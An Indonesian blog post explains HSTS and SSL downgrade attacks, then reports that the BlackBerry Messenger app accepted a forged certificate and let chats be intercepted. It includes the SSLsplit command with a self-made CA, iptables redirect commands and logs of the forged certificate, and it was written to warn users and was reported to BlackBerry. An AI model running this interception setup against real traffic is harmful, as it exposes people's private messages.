Title: BlackBerry Messenger Rentan Mitm Attack
Date: 2017-01-12 13:19
Author: Dhani Setiawan
Category: Networking
Slug: bbm-mitm
Status: Published
Comments: yes

Awalnya dari saya baca-baca tentang HSTS (HTTP Strict Transport Security). HSTS ini metode buat mencegah Man-in-the-middle (MitM) attack di komunikasi secure SSL/TLS. 

Salah satu cara attack komunikasi SSL/TLS sebelum adanya HSTS ini biasanya pakai protocol downgrade. 
Caranya, si attacker secara diam-diam menempatkan diri di tengah-tengah komunikasi SSL antara client sama server, terus dia meng-interupsi komunikasi antara client ke server.  
Di sini attacker bisa downgrade komunikasi client ke server yang awalnya secure pakai SSL didowngrade ke plain HTTP. 
Kalau user kurang teliti bisa tanpa sadar masuk jebakan ini karena tidak ada warning apa-apa di browser.

HSTS fungsinya mencegah tipe MitM ini. Caranya, server menginformasikan ke client bahwa komunikasi ke server ini harus pakai SSL/TLS. Jadinya kalau protokol di-downgrade 
ke plain HTTP koneksi bakal di terminate dan client menolak berkomunikasi sama server pakai plain HTTP.

Kelemahannya, koneksi yang pertama kali ke server yang belum pernah diakses tetap tidak terproteksi jadi tetap ada kemungkinan protokol downgrade di sini. 
Karena itu client serperti browser Firefox atau Chrome sudah dimasukkan list situs-situs yang dikenal pakai HSTS supaya koneksi ke situs-situs ini biarpun pertama kalinya tetap 
terproteksi.

<br />
Begitu HSTS ini mulai diaplikasikan, metode attack SSL/TLS downgrade jadi tidak bisa lagi dipakai di server yang ada HSTS nya.

Karena itu tes HSTS saya coba _eavesdropping_ komunikasi bukan dengan cara downgrade SSL tapi pakai cara redirect komunikasi secure nya. 
Pakai cara ini komunikasi client tetap pakai SSL/TLS cuma CA atau _Certificate Authority_ dipalsukan pakai CA buatan sendiri.

Ini gambaran bagaimana gambaran MitM komunikasi SSL/TLS.

<div class="aimg">
        <img src="//devnull.web.id/images/networking/mitm.png" alt="Man-in-the-middle attack" title="Man-in-the-middle attack" />
</div>


Tool yang saya pakai namanya SSLsplit. Metodenya, attacker ada di tengah-tengah komunikasi fungsinya jadi client sekaligus server. Jadi client buat ambil data dari server yang sebenarnya, jadi server buat meneruskan data ke client yang sebenarnya.

Pas client kirim message _client hello_ waktu SSL handshake, attacker juga kirim _client hello_ ke server. Berikutnya, server kirim _server hello_ sama _certificate_. Attacker ambil informasi dari digital certificate ini, terus dia buat _certificate signing request_ yang informasinya sama seperti yang asli, Subject DN, Common Name, dll semuanya disamakan. CSR yang sudah digenerate ini terus di-_sign_ pakai CA buatan sendiri dan jadilah digital certificate yang sama dengan certificate aslinya.

Certificate buatan ini terus dikirim ke client. Client coba verifikasi validitas certificate ini dan normalnya, kalau client itu bagus dia langsung terminate komunikasi karena CA yang menandatangani certificate itu tidak ada di trusted database. Client modern semacam Firefox atau Google Chrome pasti muncul warning karena certificate tidak trusted.

Nah pas waktu tes malah saya secara tidak sengaja temukan BlackBerry Messenger atau BBM dia vulnerable sama attack jenis MitM, tepatnya SSL Man-in-the-middle attack.

Problemnya, client BBM dia tidak ada warning yang muncul, komunikasi juga tidak di-stop biarpun certificate dipalsukan, chatting tetap bisa jalan. Parahnya lagi, BBM bukan seperti WhatsApp atau Telegram yang pakai end-to-end encryption, jadi ya pesan chatting bisa dibaca.

Ini hasil percobaan saya:

Pertama, client BBM sudah yang paling baru dari Google Play Store.

<div class="aimg">
        <img src="//devnull.web.id/images/networking/bbm-version.png" alt="BBM version" title="BBM version" />
</div>

Saya pakai port 8443 dan jalankan SSLsplit mode debug.

    sslsplit -D \
    -S /home/dhani/void/ \
    -c /home/dhani/vpn/keys/ca.crt \
    -k /home/dhani/vpn/keys/ca.key \
    https 0.0.0.0 8443

- ``-D``: Debug.
- ``-S``: Directory tempat log. Log komunikasi ditulis di direktori ini.
- ``-c``: CA certificate
- ``-k``: CA key
- ``https 0.0.0.0 8443``: Buat socket dan bind semua ip address di tcp port 8443. ``https `` berasumsi bahwa ini komunikasi http dan SSLsplit secara otomatis bisa men-_decode_ log ke http. Selain ``https`` bisa pakai ``ssl`` sama ``tcp``.

<br />

    Generated RSA key for leaf certs.
    SSLsplit 0.5.0 (built 2017-01-10)
    Copyright (c) 2009-2016, Daniel Roethlisberger <daniel@roe.ch>
    http://www.roe.ch/SSLsplit
    Build info: V:GIT
    Features: -DHAVE_NETFILTER
    NAT engines: netfilter* tproxy
    netfilter: IP_TRANSPARENT SOL_IPV6 !IPV6_ORIGINAL_DST
    Local process info support: no
    compiled against OpenSSL 1.0.1t  3 May 2016 (1000114f)
    rtlinked against OpenSSL 1.0.1t  3 May 2016 (1000114f)
    OpenSSL has support for TLS extensions
    TLS Server Name Indication (SNI) supported
    OpenSSL is thread-safe with THREADID
    Using SSL_MODE_RELEASE_BUFFERS
    SSL/TLS protocol availability: ssl3 tls10 tls11 tls12 
    SSL/TLS algorithm availability: RSA DSA ECDSA DH ECDH EC
    OpenSSL option availability: SSL_OP_NO_COMPRESSION SSL_OP_NO_TICKET SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION SSL_OP_DONT_INSERT_EMPTY_FRAGMENTS SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION SSL_OP_TLS_ROLLBACK_BUG
    compiled against libevent 2.0.21-stable
    rtlinked against libevent 2.0.21-stable
    4 CPU cores detected
    SSL/TLS protocol: negotiate
    proxyspecs:
    - [0.0.0.0]:8443 ssl|http netfilter
    Loaded CA: '/C=ID/ST=Kalimantan Timur/L=Balikpapan/O=DevNull/OU=DevNull/CN=DevNull Authority/name=ca/emailAddress=dhani.stx@gmail.com'
    Created self-pipe [r=3,w=4]
    Created chld-pipe [r=5,w=6]
    Created socketpair 0 [p=7,c=8]
    Created socketpair 1 [p=9,c=10]
    Created socketpair 2 [p=11,c=12]
    Using libevent backend 'epoll'
    Event base supports: edge yes, O(1) yes, anyfd no
    Received privsep req type 03 sz 9 on srvsock 7
    Received privsep req type 00 sz 1 on srvsock 7
    Inserted events:
    Received privsep req type 00 sz 1 on srvsock 11
      0x1f6af50 [fd 6] Read Persist
      0x1f6b470 [fd 7] Read Persist
      0x1f6ad88 [fd 5] Read Persist
      0x1f65140 [fd 3] Signal Persist
      0x1f6b6b0 [fd 1] Signal Persist
      0x1f6b7e0 [fd 2] Signal Persist
      0x1f6b910 [fd 13] Signal Persist
      0x1f6bae0 [fd 10] Signal Persist
    Initialized 8 connection handling threads
    Started 8 connection handling threads
    Starting main event loop.

Di output line ``Loaded CA`` itu informasi CA yang saya pakai.

Selanjutnya, parameter kernel untuk routing perlu diaktifkan sama nat tcp port 443 ke port 8443

    echo 1 >/proc/sys/net/ipv4/ip_forward
    iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443

Masalah bagaimana traffic packet IP bisa masuk ke interface dan di-_capture_ tidak saya bahas karena tujuan tulisan ini buat 
informasi ke user BBM sekligus pembuktian kalau BBM bisa disadap, bukan bagaimana cara attack MitM.

Nah waktu buka BBM, di output debug SSLsplit ada informasi certificate yang original sama yang buatan seperti ini.

    ===> Original server certificate:
    Subject DN: /C=CA/ST=Ontario/L=Waterloo/O=BlackBerry Ltd/OU=IT/CN=*.bbm.blackberry.com
    Common Names: *.bbm.blackberry.com/*.bbm.blackberry.com
    Fingerprint: 23:25:C7:DA:28:27:F9:54:AE:09D8:AD:C3:C9:9C:61:B5:3F:09:95
    Certificate cache: HIT
    ===> Forged server certificate:
    Subject DN: /C=CA/ST=Ontario/L=Waterloo/O=BlackBerry Ltd/OU=IT/CN=*.bbm.blackberry.com
    Common Names: *.bbm.blackberry.com/*.bbm.blackberry.com
    Fingerprint: E6:C8:E4:AB:EC:C3:2D:43:EA:D035:2C:30:98:E0:E6:9C:DC:26:81

Semuanya sama kecuali signature, atau fingerprint.

Saya tidak tau apa BBM ini verifikasi CA sama certificate fingerprint atau tidak, yang jelas komunikasi tidak ada interupsi.

Ini tes chatting BBM

<div class="aimg">
        <img src="//devnull.web.id/images/networking/bbm.png" alt="Chat BBM" title="Chat BBM" />
</div>

Dan ini log SSLsplit.

<div class="aimg">
        <img src="//devnull.web.id/images/networking/sslsplit.png" alt="SSLsplit" title="SSLsplit" />
</div>

Problem ini, saya sudah kirim email ke support BlackBerry, semoga saja mereka perbaiki.   
Saran saya sebelum vulnerability ini hilang, sebaiknya tidak kirim informasi sensitif lewat BBM. Lewat WhatsApp atau Telegram saja yang lebih secure.

Saya tidak tau apa lembaga semacam ID-SIRTII atau ID-CERT mereka juga lihat isi IP payload atau tidak, kalau iya kan berarti mereka bisa baca chatting pengguna BBM di Indonesia.

Wheeww..!!

<br />

**Artikel berkaitan:**  
[Tentang SSL/TLS + sertifikat TLS gratis dari Let's Encrypt](//devnull.web.id/misc/ssl-tls-letsencrypt.html)  
_Pembahasan yang lumayan komprehensif tentang Public Key Infrastructure atau PKI_
